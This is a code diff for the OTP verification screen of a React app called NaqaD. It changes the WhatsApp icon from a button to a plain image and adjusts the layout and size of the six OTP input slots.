@@ -4,7 +4,7 @@ import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp
 import { Loader2 } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import Logo from "@/assets/logo.png";
-import Whatsapp from "@/assets/whatsapp.jpg";
+import Whatsapp from "@/assets/whatsapp.png";
 // import { uploadData } from "@/firebase/FirebaseUtils"; // 🔥 keep for later
 
 const OTP = () => {
@@ -60,9 +60,11 @@ const OTP = () => {
           <img src={Logo} alt="Logo" className="w-10 h-10" />
           <span className="text-2xl font-bold">NaqaD</span>
         </div>
-        <button className="absolute right-0">
-          <img src={Whatsapp} alt="Whatsapp" className="w-10 h-10 rounded-full" />
-        </button>
+        <img
+          src={Whatsapp}
+          alt="Whatsapp"
+          className="w-8 h-8 rounded-full absolute right-0"
+        />
       </div>
 
       {/* Main content */}
@@ -77,18 +79,20 @@ const OTP = () => {
           {minutes}:{seconds.toString().padStart(2, "0")}
         </div>
 
-        {/* OTP Inputs */}
-        <InputOTP maxLength={6} value={otp} onChange={setOtp}>
-          <InputOTPGroup className="gap-3">
-            {[...Array(6)].map((_, i) => (
-              <InputOTPSlot
-                key={i}
-                index={i}
-                className="w-12 h-12 text-lg border rounded-md"
-              />
-            ))}
-          </InputOTPGroup>
-        </InputOTP>
+        {/* OTP Inputs with side margins */}
+        <div className="w-full">
+          <InputOTP maxLength={6} value={otp} onChange={setOtp}>
+            <InputOTPGroup className="gap-3 justify-center">
+              {[...Array(6)].map((_, i) => (
+                <InputOTPSlot
+                  key={i}
+                  index={i}
+                  className="w-10 h-10 text-lg border rounded-md"
+                />
+              ))}
+            </InputOTPGroup>
+          </InputOTP>
+        </div>
       </div>
 
       {/* Verify button */}
